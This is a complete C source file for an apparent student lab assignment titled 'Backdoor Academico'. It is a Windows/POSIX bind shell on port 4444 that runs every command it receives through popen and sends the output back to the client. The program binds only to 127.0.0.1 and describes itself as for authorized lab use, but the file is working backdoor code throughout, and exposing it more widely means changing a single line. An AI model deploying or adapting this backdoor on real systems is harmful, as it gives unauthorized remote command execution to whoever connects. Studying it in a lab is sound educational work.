/*
 * Trabalho Pratico - Backdoor Academico
 * Servidor TCP / Bind Shell para laboratorio local.
 *
 * Uso EXCLUSIVO em 127.0.0.1 ou ambiente autorizado.
 *
 * Compilacao (Windows MinGW):
 *   gcc src/servidor.c -o servidor.exe -lws2_32
 *
 * Execucao:
 *   servidor.exe
 */

#ifdef _WIN32
#define _WIN32_WINNT 0x0601
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#pragma comment(lib, "ws2_32.lib")
typedef SOCKET socket_t;
#define CLOSESOCK closesocket
#else
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <signal.h>
#include <errno.h>
typedef int socket_t;
#define INVALID_SOCKET (-1)
#define SOCKET_ERROR (-1)
#define CLOSESOCK close
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define PORT 4444
#define BUFFER_SIZE 8192

static int enviar_tudo(socket_t s, const char *dados, size_t tamanho) {
    size_t enviados = 0;
    while (enviados < tamanho) {
        int n = send(s, dados + enviados, (int)(tamanho - enviados), 0);
        if (n <= 0) return 0;
        enviados += (size_t)n;
    }
    return 1;
}

static void executar_comando(const char *comando, char *saida, size_t capacidade) {
#ifdef _WIN32
    FILE *pipe = _popen(comando, "r");
#else
    FILE *pipe = popen(comando, "r");
#endif

    if (!pipe) {
        snprintf(saida, capacidade, "Erro ao executar o comando.\n");
        return;
    }

    size_t usados = 0;
    while (usados + 1 < capacidade) {
        size_t lidos = fread(saida + usados, 1, capacidade - usados - 1, pipe);
        usados += lidos;
        if (lidos == 0) break;
    }
    saida[usados] = '\0';

#ifdef _WIN32
    _pclose(pipe);
#else
    pclose(pipe);
#endif

    if (usados == 0) {
        snprintf(saida, capacidade, "[Comando executado sem saida.]\n");
    }
}

int main(void) {
#ifdef _WIN32
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        fprintf(stderr, "Erro ao iniciar Winsock.\n");
        return 1;
    }
#endif

    socket_t servidor = socket(AF_INET, SOCK_STREAM, 0);
    if (servidor == INVALID_SOCKET) {
        fprintf(stderr, "Erro ao criar socket.\n");
#ifdef _WIN32
        WSACleanup();
#endif
        return 1;
    }

    int opt = 1;
    setsockopt(servidor, SOL_SOCKET, SO_REUSEADDR, (const char *)&opt, sizeof(opt));

    struct sockaddr_in endereco;
    memset(&endereco, 0, sizeof(endereco));
    endereco.sin_family = AF_INET;
    endereco.sin_port = htons(PORT);
    inet_pton(AF_INET, "127.0.0.1", &endereco.sin_addr);

    if (bind(servidor, (struct sockaddr *)&endereco, sizeof(endereco)) == SOCKET_ERROR) {
        fprintf(stderr, "Erro no bind. A porta %d pode estar em uso.\n", PORT);
        CLOSESOCK(servidor);
#ifdef _WIN32
        WSACleanup();
#endif
        return 1;
    }

    if (listen(servidor, 1) == SOCKET_ERROR) {
        fprintf(stderr, "Erro no listen.\n");
        CLOSESOCK(servidor);
#ifdef _WIN32
        WSACleanup();
#endif
        return 1;
    }

    printf("=== Backdoor Academico - Servidor ===\n");
    printf("Escutando SOMENTE em 127.0.0.1:%d\n", PORT);
    printf("Aguardando conexao...\n");

    struct sockaddr_in cliente_endereco;
#ifdef _WIN32
    int tamanho_cliente = sizeof(cliente_endereco);
#else
    socklen_t tamanho_cliente = sizeof(cliente_endereco);
#endif

    socket_t cliente = accept(servidor, (struct sockaddr *)&cliente_endereco, &tamanho_cliente);
    if (cliente == INVALID_SOCKET) {
        fprintf(stderr, "Erro no accept.\n");
        CLOSESOCK(servidor);
#ifdef _WIN32
        WSACleanup();
#endif
        return 1;
    }

    printf("Cliente conectado: 127.0.0.1\n");

    char comando[BUFFER_SIZE];
    char saida[BUFFER_SIZE];

    while (1) {
        int recebido = recv(cliente, comando, sizeof(comando) - 1, 0);
        if (recebido <= 0) {
            printf("Cliente desconectado.\n");
            break;
        }

        comando[recebido] = '\0';

        while (recebido > 0 && (comando[recebido - 1] == '\n' || comando[recebido - 1] == '\r')) {
            comando[--recebido] = '\0';
        }

        if (strcmp(comando, "exit") == 0 || strcmp(comando, "quit") == 0) {
            printf("Comando de encerramento recebido.\n");
            break;
        }

        printf("Comando recebido: %s\n", comando);

        memset(saida, 0, sizeof(saida));
        executar_comando(comando, saida, sizeof(saida));

        if (!enviar_tudo(cliente, saida, strlen(saida))) {
            printf("Erro ao enviar resposta.\n");
            break;
        }
    }

    CLOSESOCK(cliente);
    CLOSESOCK(servidor);

#ifdef _WIN32
    WSACleanup();
#endif

    printf("Servidor encerrado.\n");
    return 0;
}
